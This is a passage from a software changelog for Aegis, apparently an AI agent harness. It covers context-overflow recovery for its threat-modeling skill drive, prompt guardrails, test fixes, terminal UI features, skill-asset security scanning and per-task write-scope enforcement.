# Aegis Release History

This is the shipped-feature changelog and historical design record for Aegis — every completed
roadmap item, why it was built, what it touched, and how it was tested. For what's currently open
or next, see [roadmap.md](roadmap.md).

---

## Latest changes

**Last updated:** 2026-07-27 — **P47.6 shipped** (drive model-selection guidance, doc-only: a new
"Driving the build on a local model" section in `internal/skills/builtin/threat-modeling/README.md`
documents the throughput/looping tradeoff — a small "fast" active-parameter MoE like `a3b` loops more
on self-verification and costs more turns than a steadier `-deep`/larger model, though both now finish
since the P47.1-P47.8 code fixes made the drive resumable regardless of model; the optional startup-hint
half of the item is deferred as speculative — see below). Previously, 2026-07-27 — **P48.1 shipped** (config-test hermeticity: four `Load()`-based tests in
`internal/config/config_test.go` now call `redirectConfigDir(t)` so they assert built-in defaults / env
overrides against an empty temp config dir instead of the developer's real `~/.config/aegis/config.yaml` —
fixing a standing local failure of `TestOutputGuardDefaults` on a machine that disables the output guard,
and closing the latent same-class trap in `TestEnvOverride`/`TestEnvBaseURL`/`TestEnvOverrideServerLimits`
that passed only by env-override luck — see below). Previously, 2026-07-27 — **P39.10 and P39.11 documented + regression-tested** (backfilling the
remaining P38.1 debt: the two 2026-07-23 `chat --skill`-CLI fixes that shipped on `tier3-batch` but never
got a release note or tests — builtin skills now materialize into `<cwd>/.aegis/builtin-skills` so the
sandboxed file tools can reach `recon.py`/`scaffold.py` (**P39.10**), and the drive-completion oracle
skips that materialized skill source so its example `<!-- PENDING -->` markers no longer keep the drive
from ever converging (**P39.11**) — see below). Previously, 2026-07-27 — **P47.5, P47.7, and P47.8
shipped** (the next three P47.x phased-drive stability items: the phased threat-model drive now auto-sizes the Ollama serving window
to the model's recommended max up front and escalates `num_ctx` toward the model max on a context
overflow — removing the manual `AEGIS_PROVIDER_CONTEXT_WINDOW` bump the 2026-07-24 run needed
(**P47.5**); a context overflow during the phase-6 verify/quality remediation loop now resets to a
fresh context and retries instead of aborting the whole drive on the raw error (**P47.7**, the
phase-6 parity for the shipped P47.2 content-phase reset); and both phase-6 prompts now carry the
P39.14 anti-monolithic-write guardrail so the drive stops trying to fill many empty sections with one
truncating whole-file `write_file` (**P47.8**) — all three from the 2026-07-27 FirewallRiskRater run
that validated the ec0127c hollow-report checks — see below). Previously, 2026-07-24 —
**P47.3 shipped** (the two large content-phase seeds and the shared
in-phase continuation prompt of the phased threat-model drive now explicitly tell the model not to
re-audit already-filled files or recompute STRIDE/coverage counts by hand to self-check — the exact
in-phase token-burn that drove both context overflows on the 2026-07-24 FirewallRuleAnalyzer run,
work the deterministic phase-6 verifier already owns — the third P47.x phased-drive stability item,
cutting how often P47.1/P47.2 must act — see below). Previously, 2026-07-24 — **P47.2 shipped** (a
context-overflow error mid-phase now resets the phased threat-model drive to a fresh context and
retries the phase from disk instead of aborting the whole drive — the second P47.x phased-drive
stability item, the residual-recovery complement to P47.1's compaction — see below). Previously,
2026-07-24 — **P47.1 shipped** (proactive per-turn
compaction wired into the CLI `chat --skill` drive engine — the head of the P47.x phased-drive
stability batch, which alone would have prevented both context-overflow aborts on the 2026-07-24
FirewallRuleAnalyzer run — see below). Previously,
2026-07-24 — **P39.12, P39.13, P39.14, and P39.15 shipped** (threat-model drive robustness,
from the P38.1 full-stack test vs FirewallRuleAnalyzer on qwen3.6:35b: a 30-minute default response-header
timeout, a 1500-line default cap on `read_file`, a hard one-section-per-`edit_file` rule against monolithic
writes, and a final quality-and-sanity pass after mechanical verify — see below). Previously,
2026-07-23 — **the Tier 3 batch shipped: P40.3, P40.4, P40.7, P40.9, and P45.2** (full-text
transcript search, an experimental opt-in kitty-graphics image tier, shared form-panel chrome extraction,
inline mermaid-diagram ASCII rendering, and hunk-level agent-vs-external change attribution — see below).
Earlier the same day: **P40.1, P40.2, P40.5, P40.6, P40.8, P44.1, and P45.1 shipped** (the
parallelizable Tier-2 batch: the five-item TUI/UX set — resizable panes, consistent hjkl/g/G navigation, auto
dark/light detection, a contextual per-pane footer, and LaTeX→Unicode math rendering — plus two independent
hardening items: bundled-skill-asset admission scanning and worktree dirty-file replication — see below).
Earlier the same day: **P46.1, P46.2, and P46.3 shipped** (the codex-build workflow-discipline
track: per-task file-write scope enforcement, a pre-commit test gate on `git_commit`, and a `structured-build`
skill packaging both into a one-task-one-commit workflow — see below). Previously the same day: **P41.1 shipped**
(compaction's flat chars/4 token estimate replaced with the engine's script-aware one via a new shared
`internal/tokenest` package — see below). Previously,
2026-07-22: **P43.1 shipped** (debate concession-detector negation blindness, found
examining `internal/debate`/`internal/swarm` reliability — see below). Earlier the same day: **P42.1 and
P42.2 shipped** (workspace-trust and capability-spoofing gaps in `internal/plugins`, found by a scoped
security self-review — see below). Earlier still: **P39.7 shipped** (no-progress guard on the `--skill`
drive loop — see below). Previously, 2026-07-21: **P38.6 and P38.7 shipped** (the two actionable engineering
findings split out of the P38.1 conformance re-test — see below). Earlier the same day: **P39.1, P39.2, and
P39.4 shipped; P39.3 spiked and closed NO-GO** (all from a local-14b-model harness-improvement research pass
— see [roadmap.md](roadmap.md)).

**P47.6 — drive model-selection guidance (doc-only).** The self-verification looping that drove the
context growth on the 2026-07-24 FirewallRuleAnalyzer run traced proximately to the drive model: a
small "fast" active-parameter MoE (`a3b`, ~3B active) loops more — re-auditing already-filled files
and recomputing STRIDE/coverage counts by hand — than a steadier `-deep` variant or a larger dense
model, so it burns more turns and wall time to reach the same verify-clean suite. The P47.1-P47.8 code
fixes make the drive converge *regardless* of model (proactive compaction, on-overflow phase reset,
window auto-escalation, the `noSelfVerifyInstruction` guardrail, phase-6 overflow recovery), so this is
a throughput/looping mitigation, not a correctness gate. Shipped as a "Driving the build on a local
model" section in `internal/skills/builtin/threat-modeling/README.md` — the natural home because it is
guidance for the *user* choosing which model to point the drive at (the driving model can't reselect
itself), not skill instructions the model reads. The optional second half of the item — a startup hint
when a small MoE is the configured drive model — is deferred as speculative until a user actually hits
the tradeoff; the doc note is the primary deliverable, and the code fixes address the mechanism for
every model. No product code; README lives under the recursive `//go:embed builtin` pattern, so
`go test ./internal/skills/...` still passes.

**P48.1 — isolate config tests from the developer's real `~/.config/aegis/config.yaml`.**
`TestOutputGuardDefaults` called `config.Load()` without the `redirectConfigDir(t)` isolation its sibling
tests use, so it read the developer's real user config; on a machine whose config sets
`output_guard.enabled: false` (the common local setting) it failed its "defaults to true" assertion —
`Load()` had correctly applied the user layer, but the test meant to check the *built-in default*. It passed
in CI only because CI has no user config. Three sibling `Load()`-callers had the same latent gap, passing
today only because an env override dominated the leaked user value: `TestEnvOverride`, `TestEnvBaseURL`,
`TestEnvOverrideServerLimits`. Fix: `redirectConfigDir(t)` (which redirects `HOME`/`XDG_CONFIG_HOME`/`APPDATA`
to an empty temp dir) is now the first line of each, making every `Load()`-based config test hermetic
regardless of the developer's environment. Test-only change, no product code; `go test ./internal/config/...`
now passes on a customized dev machine, not just in CI.

**P47.5 — right-size the per-phase context window up front and auto-escalate on overflow.** The
2026-07-24 FirewallRuleAnalyzer run only converged after a manual `AEGIS_PROVIDER_CONTEXT_WINDOW=196608`
because the generic configured window was too small for the phased build, and a mid-phase overflow was
terminal. Two levers close that. (a) Up-front sizing: for a phased `--skill` drive on an Ollama-backed
provider, `recommendPhasedDriveWindow` (`internal/cli/chat.go`) probes the model's training-context max
and, when `ollamainfo.RecommendContextWindow(modelMax)` beats the configured window, raises
`cfg.Provider.ContextWindow` *before* the adapter is built — so both the `num_ctx` sent to Ollama and the
P47.1 compaction budget get the room the phased build needs, with a notice, and no manual step. (b)
On-overflow escalation: a new optional adapter capability `provider.ContextWindowRaiser`
(`RaiseContextWindow`, implemented by the native Ollama adapter and reached through the retry/failover
decorators via `provider.RaiseContextWindow`'s `Unwrap` walk) lets a phase double `num_ctx` toward the
model max on a context overflow (`nextDriveWindow` — a doubling step, gentler on GPU memory than a jump to
max), additive to the P47.2/P47.7 fresh-context reset. The compaction budget stays at the sized window
deliberately — a larger `num_ctx` only buys physical headroom against a transient overshoot. Regression
tests: `TestNextDriveWindow`, `TestRaiseContextWindow` (ollama, monotonic + actually-sent),
`TestRaiseContextWindow_UnwrapsDecorators` (provider, unwrap chain), and the non-Ollama sizing gate.

**P47.7 — a phase-6 context overflow resets instead of aborting the drive.** P47.2 made a mid-phase
overflow a resumable fresh-context reset, but only in the content-phase loop; the phase-6 verify/quality
loop (`runPhasedVerifyAndQuality`, `internal/cli/chat_verify.go`/`chat_phased.go`) returned the engine
error straight up, so an overflow during a verify-fix or quality turn aborted the *whole* drive on the raw
`ollama: response truncated at the context limit … unexpected end of JSON input` — with no reset, no verify
rounds 2/3, and no `.quality-stamp.json` (observed 2026-07-27, FirewallRiskRater). The fix adds
`recoverPhase6Overflow`: a context overflow during a phase-6 turn escalates the window (P47.5b), counts the
reset against a bounded `maxPhase6OverflowResets`, and loops again — the next iteration re-runs the
mechanical checks and re-issues the turn from a fresh, run-dir-oriented context (`runPhase6Turn` already
builds a fresh conversation, so the reset is implicit). A non-overflow error is still surfaced as terminal;
once the reset budget is exhausted it prints a resumable stop notice and ends the drive cleanly. A subtle
correctness fix rides along: `qualityReviewed` is now set only *after* the quality turn completes, so a
turn that overflowed mid-review is not mistaken for a finished pass and stamped. Regression-tested by
`TestRecoverPhase6Overflow` (three-way classification, escalation-per-retry, budget-exhaustion stop) and
`TestTryEscalateWindow_NilSafe`.

**P47.8 — carry the anti-monolithic-write guardrail into the phase-6 prompts.** The content-phase prompts
forbid whole-file rewrites (the P39.14 "one section, one edit … a monolithic write truncates" lesson), but
`verifyFixPrompt` and `qualityReviewPrompt` only said to "resolve every failing check" — so, told to fill 15
empty finding bodies, the drive chose a single whole-file `write_file` of the ~400-line `3-findings.md`,
whose tool-call JSON truncated and triggered the P47.7 overflow (2026-07-27). Both phase-6 prompts now carry
a shared `phase6IncrementalEditRule`: make each fix a small targeted `edit_file` — one section/row per edit,
never regenerate a whole file, never `write_file` a suite file. Cheap, reusing the existing P39.14 rule; it
reduces how often the overflow fires while P47.7 recovers when it still does. Regression-tested by
`TestPhase6PromptsCarryIncrementalEditRule`.

**P47.3 — stop content phases burning context on manual self-verification.** On the 2026-07-24
FirewallRuleAnalyzer run both context overflows were driven by the same behavior: the model re-reading
already-filled suite files and recomputing STRIDE coverage arithmetic across dozens of in-phase turns —
work the deterministic phase-6 `verify.py` / `inventory.py` already own authoritatively. The content-phase
seeds (`phasePromptAnalysis`, `phasePromptFindings`) and the shared `phaseContinuePrompt` in
`internal/cli/chat_phased.go` never told the model to stop. The fix adds one shared instruction
(`noSelfVerifyInstruction`): do not re-read or re-audit files whose `<!-- PENDING -->` markers are already
cleared, and do not recompute STRIDE/threat/coverage counts by hand to double-check your own work — the
phase-6 verifier does that later — spend each turn filling the next marker and nothing else. It is woven
into the two large content-phase seeds and the in-phase continuation prompt; the short DFD/assessment seeds
are left as-is. The findings seed additionally clarifies that reading the prior-phase analysis file to
source the coverage table is expected authoring, not self-checking, so the instruction doesn't suppress a
legitimate read. This is a pure prompt change — no code-path risk — that attacks the token-burn at its
source, cutting per-phase turn count and context growth regardless of whether compaction is on, so it
reduces how often the P47.1/P47.2 defenses have to act. Regression-tested (`chat_phased_test.go`:
`TestContentPromptsSuppressSelfVerification`) that all three carriers hold the instruction and that it names
the mechanical verifier as the authority. Third item of the P47.x phased-drive stability batch.

**P47.2 — a context-overflow error resets the phase instead of aborting the drive.** Even with P47.1's
compaction wired, a residual overflow can still happen (a single oversized turn, an undetectable local
window). When it did, `runPhasedSkillDrive`'s inner loop returned the engine error verbatim, so a
terminal `NewContextTruncationError` (or an Ollama hard-reject envelope) aborted the **whole** phased
drive — even though the failure is *resumable at the phase level*: the phase's `<!-- PENDING -->` files
persist on disk, and a fresh, near-empty context re-reads them and continues (exactly why the 2026-07-24
manual re-runs worked). The fix detects that specific error class inside the loop and, instead of
`return err`, resets `conv` to a fresh conversation and retries the phase — the same fresh-context reset
the drive already does at phase *boundaries*, now applied within a phase on overflow. A new
`provider.IsContextOverflowError` classifies only the size-caused terminal errors a smaller context can
recover from (the P35.2 truncation error plus context-size stream envelopes), deliberately excluding
size-independent terminal failures (model-not-found, malformed) and response-header timeouts where a
reset would only loop. The reset counts as a turn so the existing `--max-turns` guard still bounds it,
and a new `freshPhaseConv` helper chooses the reseed prompt: the in-phase continuation prompt when files
exist on disk, or the full phase seed prompt when the setup phase overflowed before the run directory
was even created. Regression tests cover the classifier's include/exclude boundaries
(`internal/provider/errors_test.go`) and the reseed choice (`chat_phased_reset_test.go`). Second item of
the P47.x phased-drive stability batch; the residual-recovery complement to P47.1 (compaction prevents
most overflows, this recovers from the rest).

**P47.1 — proactive compaction wired into the CLI `chat --skill` drive engine.** The daemon builds its
engine with both a resolved context window and a `Compactor`, so engine.Run's proactive per-turn compaction
(fires at 85% fill, gated on `contextWindowTokens > 0` **and** a non-nil compactor) runs on the server path.
The CLI `engine.New` in `internal/cli/chat.go` set **neither**, so the phased threat-model drive — which runs
entirely on the CLI engine and grows context every turn — had no defense against its own growth: on the
2026-07-24 FirewallRuleAnalyzer run, context climbed until Ollama hard-rejected the request (173,816 vs a
131,072 window) and the drive aborted with a terminal `NewContextTruncationError`, three separate times,
each needing a manual re-invocation. The fix mirrors the server (~a few lines already proven in
`internal/server/engine_build.go`): a new `driveCompaction` helper resolves the effective window the same way
the daemon does — configured `provider.context_window`, reconciled downward when a *loaded* Ollama model is
actually serving less (via `ollamainfo.Detect`, the silent-front-truncation guard) — builds a
`compaction.Summarizer` over it (preferring `provider.small_model` for the summary calls, skipping
auto-compaction rather than defaulting to the 120k cloud budget when a local window is still unknown), and
passes `ContextWindowTokens` + `Compactor` into the CLI `engine.New`. Both the single-context linear drive and
the P38.8 phased drive reuse that one engine, so both gain the defense. Extracted into `driveCompaction` so a
regression test (`chat_compaction_test.go`) can assert the CLI path keeps compaction enabled (non-zero window
+ non-nil compactor) and can't silently diverge from the daemon again. Head of the P47.x phased-drive
stability batch; on its own it would have prevented both aborts on the 2026-07-24 run.

**P39.10 / P39.11 — `chat --skill` workspace materialization + drive-oracle skip (from the P38.1
gpt-oss:20b re-test).** The 2026-07-23 gpt-oss:20b run died *before* model capability was tested, on
two `chat --skill`-CLI bugs that both shipped on `tier3-batch` and were verified live end-to-end; this
entry backfills the release note and the regression tests that were the remaining P38.1 debt.

- **P39.10 — materialize enabled builtin skills into the workspace, not just the data dir**
  (`internal/cli/chat.go`, `skills.MaterializeBuiltinsToProject`). `aegis chat` runs in-process and only
  extracted the embedded builtin skills to `<dataDir>/builtin-skills`, which is *outside* the sandboxed
  workspace root — so the file tools (confined to `cwd`) rejected reading a skill's bundled scripts, and
  the model couldn't reach `recon.py`/`scaffold.py` to start the build. The CLI now mirrors the daemon and
  also materializes the enabled builtins into `<cwd>/.aegis/builtin-skills`, so the `<skill_assets>`
  manifest resolves to a workspace-relative path the file tools accept and `skills.Load` prefers the
  project copy. Covered by `internal/skills/embedded_test.go`
  (`TestMaterializeBuiltinsToProjectPlacesAssetsReachableByReadFile` and siblings).
- **P39.11 — the drive-completion oracle skips the materialized skill source**
  (`internal/cli/chat.go`, `scanPendingMarkers`/`suiteFileCount`). With P39.10 placing the skill's own
  skeleton/reference assets under `<cwd>/.aegis/builtin-skills`, those files carry the skill's *example*
  `<!-- PENDING: … -->` markers — so the PENDING-marker completion oracle walked the skeleton templates
  and could never reach zero (the drive never converged, phase-6 verify never fired), and the P38.6
  fabricated-success floor check counted skill source as build output. Both walks now `SkipDir` the
  `builtin-skills` subtree (`pendingSkipDir`, mirroring `skills.builtinSkillsDirName`). Regression tests
  `TestDriveOraclesSkipBuiltinSkillsSubtree` (synthetic) and `TestDriveOraclesSkipRealMaterializedBuiltins`
  (drives the real `MaterializeBuiltinsToProject` output, so a dir rename or a skeleton change that
  reintroduced live markers fails the test) in `internal/cli/chat_drive_test.go`.

With the scripts reachable, gpt-oss:20b itself then failed to converge from small-model
path/argument brittleness (mangled script paths, a typo'd run-dir, a non-existent `search` tool, the
wrong `--framework` flag) — a model-competence limit, not a harness bug, and separate from these two fixes.

**P39.12 / P39.13 / P39.14 / P39.15 — threat-model drive robustness (from the P38.1 full-stack test).**
The 2026-07-24 full-stack test drove the built-in `aegis chat --skill threat-modeling` against a lean copy of
FirewallRuleAnalyzer (FastAPI + MariaDB, ~8.7K LOC) on `qwen3.6:35b-a3b-fast` via the native ollama adapter.
It cleared the harness and model-competence questions — the drive ran recon → scaffold → fill, held the
run-dir path across every `edit_file` (the old gpt-oss:20b mangling did not recur), produced grounded
file:line-cited threats, and its DFD passed `lint_dfd.py` 5/5 — but did not reach a verify-clean suite because
of throughput and write robustness, not orchestration. Four fixes, all with regression tests:

- **P39.12 — default `provider.response_header_timeout` 5m → 30m** (`internal/provider/sse/sse.go`). Run 1
  aborted at turn 7: reading the 2845-line `fwweb/main.py` in one turn pushed the next prefill past the
  5-minute header timeout at ~7 tok/s on a local 35B. Ollama withholds the response header until prefill
  finishes, so a large-context threat-model turn legitimately needs longer; 5m was too tight for any
  content-rich repo on modest hardware. Tests updated in `sse`, `config`, and `ollama`.
- **P39.13 — `read_file` caps an unbounded read at 1500 lines** (`internal/tool/builtin/file.go`). One
  whole-file read of a large source file is the per-turn context spike that both blew the timeout above and
  drove cumulative session input to 3.47M tokens before truncating at the context limit. The tool already
  took `offset`/`limit`; now an unbounded read returns the first 1500-line window plus a notice telling the
  model to page with `offset` or grep for the part it needs. An explicit limit is still honored verbatim.
  Regression test `TestReadDefaultLineCap`.
- **P39.14 — one section per `edit_file`, no monolithic writes** (SKILL.md §4 + `chat.go` continuation/act-now
  prompts). The model wrote the entire findings file in a single `edit_file` (~5,700 tokens, ~13 min at
  7 tok/s), and on the final run that write truncated into a malformed tool call (`unexpected end of JSON`).
  The skill's context-bounding levers and the drive prompts now hard-require filling exactly one
  `<!-- PENDING: <section> -->` marker per `edit_file` call, and read source in ranges rather than whole.
- **P39.15 — a final quality-and-sanity pass after mechanical verify** (`chat.go`, `chat_verify.go`). The
  phase-6 scripts verify structure and counts but not substance; verify.py caught real model errors (a Tier-2
  threat with a Tier-1 prerequisite, `AV:N` on the non-network `IngestWorker`) yet a build can pass the
  scripts with vague evidence, filler, or incoherent severities. When the scripts verify clean the drive now
  runs one bounded, once-only self-review turn (`qualityReviewPrompt`) checking groundedness, filler, and
  internal consistency and fixing issues in place; the mechanical checks re-run afterward, so a review edit
  that breaks a script check is caught by the existing fix loop. Test `TestQualityReviewPrompt`. The **P38.1**
  umbrella stays open pending a verify-clean re-run with these fixes on a smaller target or faster model.

**P40.3 — full-text search within a session's transcript.** Every picker fuzzy-filters lists of turns, but
nothing grepped the actual message *content* of the open session, so "find the earlier message where I asked
about X" had no answer short of manual scrolling. A new incremental search mode (`internal/tui/search.go`),
opened with **ctrl+f** (rebindable `transcriptsearch`), captures keyboard input like lnav's `/`-search: typing
edits the query live, ⏎/↓/ctrl+n and ↑/ctrl+p step between matches (wrapping), esc closes. `transcriptPane.Search`
greps each item's ANSI-stripped raw text case-insensitively; the focused match is scrolled to the top and marked
with the existing focused-item accent bar, and every visible occurrence is reverse-highlighted in place
(`highlightSearchMatches`, width-preserving so the selection/focus overlays keep working). The search bar
replaces the composer's status line while active, keeping the input-area height stable. Tests: `search_test.go`
(pane grep, navigation/wrap, the full ctrl+f→type→esc Update flow, highlighter width-preservation).

**P40.9 — inline mermaid diagrams now render as box-drawing ASCII in the transcript.** `render_diagram` only ever
produced a *file*; a model that inlined a ` ```mermaid ` snippet just got an unstyled code block. A new
dependency-free package `internal/mermaidascii` renders the common shapes — flowchart/graph (`TD/TB/BT/LR/RL`,
node shapes `[]`/`()`/`{}`/`(())`, edge-label forms, dotted/thick links) and `sequenceDiagram` (participants,
lifelines, solid/dotted arrows) — into box-drawing text, best-effort (`Render` returns `ok=false`, never an
error, on unsupported/unparseable input) and output-size capped (60 nodes / 80 messages). Multi-child branches
compose real T-/cross-junctions via a per-cell direction mask rather than the last edge clobbering the first. A
`renderMermaidBlocks` preprocessing pass in `mdRender` (`internal/tui/mermaid.go`) swaps each *complete*
` ```mermaid ` fence for the rendered ASCII in a plain code fence; unsupported diagrams and mid-stream
unterminated fences are left byte-for-byte untouched (raw source still shows). Tests: `mermaidascii_test.go`
(pinned canvases for a tiny graph + sequence, LR/shapes/labels/branch-junction/caps/CRLF), `mermaid_test.go`
(fence substitution, untouched cases, transcript integration).

**P45.2 — hunk-level agent-vs-external change attribution.** `internal/filetracker` only tracked whole-file
mtimes, so there was no way to answer "which lines in this file did the agent author" (needed for scoped diff/
revert UX). A new `hunks.go` records, per successful `write_file`/`edit_file`/`multiedit`, the changed line
ranges attributed to the agent — computed with a dependency-free stdlib LCS line diff (bounded, degrading to
whole-file attribution above the bound) — remapping and merging previously recorded hunks through each edit
(`RecordAgentWrite`). `AgentHunks` reconciles the stored ranges against a fresh disk read: a hunk survives an
external edit only if all its lines remain present and contiguous, so an out-of-band change drops just the
overlapping hunks (survivors shift) rather than the whole file's state. The existing mtime-based `CheckWrite`
read-before-write guard is untouched; all additions are additive. Tests: `hunks_test.go` (14 cases — recording,
merge, external-edit drop/shift, pruning, diff primitives) plus the wired write/edit tools.

**P40.7 — the two hand-built form overlays now share one panel-frame helper.** `securityConfigModel` and
`wizardModel` are `huh` multi-step forms, not `listDialog` pickers, so they can't literally reuse the list
widget — but both hand-rolled a byte-identical rounded accent-bordered frame in their `view()`. That frame is
now a single `fixedPanelFrame(content, width)` helper in `dialog.go`, beside `dialogFrame`/`renderOverlay`, so
the overlay chrome (border, accent, padding) is defined once; width stays per-form. The dimming/centering half
of the shared chrome the two forms already got from `renderOverlay`. Behavior is unchanged (existing
wizard/securityconfig tests stay green); this is the safe, real de-duplication the item targeted, in place of
forcing form input into a list picker.

**P40.4 — an experimental, opt-in kitty-graphics image tier (prototype).** The half-block thumbnail flows
through the cell-grid renderer as ordinary SGR text; a true kitty/iTerm2 escape does not, and there is no such
terminal in CI to verify placement against — the reason the tier was originally descoped. P40.4 lands the
building blocks the roadmap asked for as tested, safe increments: `detectKittyGraphics` (env-based:
kitty/Ghostty/WezTerm/Konsole) and a correct, chunked kitty graphics-protocol encoder (`kittyGraphicsSequence`,
`f=100,a=T`, ≤4096-byte `m=1/m=0` chunks, scaled to a cell box). It is wired only behind an explicit
`image_rendering: "kitty"` opt-in — **never** auto-selected; `"auto"` stays half-block — so the safe default is
untouched. The render-loop placement remains the unverified step and is documented as such (in code and
`docs/configuration.md`). Tests: `kitty_test.go` (detector, opt-in resolution, escape structure + chunking, the
never-error thumbnail path).

**P40.8 — LaTeX math now renders as a Unicode approximation in the transcript instead of raw markup.**
`newGlamourRenderer` wires up plain glamour with no math extension, so `$E=mc^2$` or a `$$...$$` block showed
as literal dollar-sign text (goldmark has no math awareness). Following xAI `grok-build`'s terminal-appropriate
approach — a Unicode approximation, not real TeX typesetting — a new `renderMathUnicode` preprocessing pass
(`internal/tui/latex.go`) runs in `mdRender` ahead of glamour: it converts `$...$`/`$$...$$` spans to Unicode
(super/subscripts, Greek letters, operators/relations, arrows, `\frac{a}{b}`→`(a)/(b)`). Two safety rules keep
it from mangling prose: fenced code blocks and inline code spans pass through untouched (a shell `$HOME` is
never rewritten), and a single-`$…$` span converts only when its content actually looks like math (a backslash
command or `^`/`_`), so currency like "$5 and $10" is left alone. Non-representable exponents keep their
literal `^{…}` form. Tests: `latex_test.go` (conversions, code preservation, currency, unbalanced/escaped `$`).

**P40.5 — the default theme now auto-detects the terminal's light/dark background.** Aegis always defaulted to
the dark scheme and required an explicit `/theme`/config value to switch to light. `tui.theme` now defaults to
`"auto"`: `Run` binds a provisional dark scheme (lipgloss captures colors at style-creation time), `Init`
issues bubbletea v2's `RequestBackgroundColor`, and `Update` applies the light or dark scheme from the
`tea.BackgroundColorMsg.IsDark()` reply — rebuilding `m.th`/`m.renderer` the same way the live `/theme` switch
does. `/theme auto` re-enables detection; any explicit `/theme <name>` clears the auto flag so a later
background report can't override the user's choice. Tests: `TestIsAutoTheme` plus the existing theme-switch
coverage.

**P40.2 — hjkl/g/G scrolling is now consistent across every scrollable content surface.** `j`/`k` worked on
the transcript and completion popup but the transcript pane and the tool-card (`transientPanel`) overlay had
divergent scroll vocabularies. Both now share the full vi set: `j`/`k` (line), `u`/`d`+`ctrl` (half-page),
`b`/`f`/`space`/`ctrl+f`/`ctrl+b` (page), and `g`/`G`+`home`/`end` (top/bottom). The terminal pane and
completion popup are input surfaces where letters are typing, so they keep `pgup`/`pgdn` only, by design.
Tests: extended `TestTranscriptHandleKeyMatchesViewportDefaults`.

**P40.1 — the sidebar and terminal panes are now resizable.** Both were fixed-width constants
(`sidebarInnerW`, `termPaneVpW`), toggled but never resized. The live widths are now per-model state
(`m.sidebarW`, `m.term.width`), adjustable within min/max bounds with `ctrl+←`/`ctrl+→` on the focused pane
(terminal when it has focus, else the sidebar) — `ctrl`+arrows are free, since the textarea uses `alt`+arrows
for word navigation. A new `resizePane` method clamps and re-runs `layout()`; the terminal pane gained
`setWidth`/`totalW` and re-wraps its buffer on resize. Tests: `paneresize_test.go` (grow/shrink, bound
clamping, terminal-focused resize, no-focus no-op).

**P40.6 — the status-bar hint footer is now scoped to the focused input surface.** The bottom bar always
showed a static `ctrl+k · f1 · ctrl+e` hint regardless of focus. A new `contextualFooterHints` method
(sourced from `m.keys`, so `tui.keybindings` overrides are reflected) shows chat-composer hints by default
(palette / help / editor, plus a resize hint when the sidebar is open) and terminal-pane hints
(`esc chat` / diagnose / resize) when the terminal has focus — lazygit's focus-scoped bottom-bar precedent.
Tests: `footer_test.go`.

**P44.1 — bundled skill assets now go through admission scanning before being surfaced to the model.**
Surfaced comparing against Cisco's DefenseClaw, whose CodeGuard admission gate statically scans a skill asset
before it's trusted. A bundled skill directory (`.aegis/skills/<name>/SKILL.md` + companion `scripts/`,
`references/`) can ship arbitrary `.py`/`.sh` files that `withAssetManifest` lists for the model to read/run,
but `wrapUntrustedSkill` only wrapped the SKILL.md *prose* — the scripts' content went unscrutinized. Added a
`skills.BundleScanner` seam (a plain package var set once at startup, matching the security package's
`inspectImageID`/`cacheFileExists` idiom; `skills` does not import `security`) wired at daemon (`server.New`)
and CLI (`aegis chat`) startup to `security.ScanBundleWarnings`, which runs the same `DefaultScanners` over the
directory that `aegis security scan` drives and returns one warning line per HIGH/CRITICAL finding. On
discovery of a bundled *untrusted* directory (never the embedded built-ins), `appendFromDir` folds any warning
into the top of the `<skill_assets>` block with do-not-run framing — the same "frame it as data, never drop
it" posture `trust.Wrap`'s scan-hit path takes. The verdict is baked into the skill content already memoized by
`discoverCache`'s directory signature, so re-scanning happens only when the bundle changes. Degrades to a
silent no-op when the multiscanner image isn't built and no host scanner is installed (every scanner resolves
to `MethodNone` → zero findings → nil), mirroring `verifyMultiscannerImage`. Tests:
`internal/skills/bundlescan_test.go` (seam, fold-in, degradation, trusted-exclusion) and
`internal/security/skillscan_test.go` (severity filter, formatting, degradation).

**P45.1 — `worktree.Manager.Add` now carries uncommitted/untracked files into a new worktree.** `git worktree
add` only checks out the committed tree, so staged/unstaged/untracked changes in the source working tree were
invisible to a new worktree — spawning a subagent into an isolated worktree silently dropped the caller's
in-progress edits. Surfaced comparing against xAI `grok-build`'s `xai-fast-worktree`. `Add` now runs a
copy-on-top pass (`carryDirty`) after the standard `git worktree add` — leaving its committed-checkout and
`-b` semantics untouched — that parses `git status --porcelain -z` (NUL-terminated, verbatim paths) and mirrors
the source working tree's dirty state onto the fresh checkout: it copies modified/staged/untracked files
(preserving mode and symlinks, creating parent dirs) and applies deletions and rename old-name removals so the
worktree faithfully reflects the source. gitignored files are excluded automatically (porcelain omits them
without `--ignored`). A new `AddCarry` additionally returns the carried paths; `aegis worktree add` prints
`carried N uncommitted file(s)…` so the behavior is discoverable. Tests:
`TestAddCarriesDirtyState`/`TestAddCarriesRename`/`TestAddCleanTreeCarriesNothing`.

**P46.1 — Per-task file-write scope is now mechanically enforced, not just advisory session-wide rules.**
Surfaced comparing against `codex-build` (a Claude-orchestrates-Codex workflow whose `check_scope.py`
mechanically verifies a task's writes stay within a declared per-task path allowlist). Aegis's write gating
was all session-lifetime: the mode gate is path-blind, and text allow/deny rules (`internal/permission/rules.go`)
are parsed once at load and apply for the whole session — nothing let a task say "I should only be touching
these files" and have it enforced. Added a new `permission.TaskScope` (a mutable, mutex-guarded per-session
allowlist of path globs) plus `permission.ScopeGate`, wired as the **outermost** gate in `server.buildGate`
so an out-of-scope write is refused even when a standing `allow write(...)` rule would grant it (the scope is
a further restriction the task opted into, not a competing permission). The scope rides on the run context —
the engine passes one context into both `gate.Check` and `tool.Execute`, so a new deferred `scope` tool
(`set`/`clear`/`show`, capability `read` so it's usable in plan mode too) mutates the same object the gate
reads. Scope restricts writes only (`write_file`/`edit_file`/`multi_edit`, via `path`/`file_path`/`edits[].path`);
reads are never restricted, and a path-less write-capability tool (git_commit, remember) is never scope-blocked.
Paths and patterns go through the same normalization as `RuleGate`'s Read/Write matching so a `..`/case/separator
trick can't dodge the scope. Per-session `TaskScope` stored on the server (`taskScopeFor`), injected into
`runCtx`, and cleaned up on session delete. Tests: `internal/permission/scope_test.go` (gate enforcement,
inactive-passthrough, pathless-write and read exemptions, traversal) and `internal/tool/builtin/scope_test.go`
(tool set/show/clear, no-context error). Full `go test ./...` green.

**P46.2 — `git_commit` now runs an optional pre-commit test gate before committing.** Same `codex-build`
comparison: its loop refuses to commit unless the configured test command just passed. Aegis's
`gitCommitTool.Execute` was a straight passthrough — no test-command config, no check that anything ran, only
the ordinary `CapWrite` permission gate. Added `config.GitConfig.PreCommitTestCommand` (+
`PreCommitTestTimeoutSec`, default 600s): when set, `git_commit` runs it in the workspace on the host (same
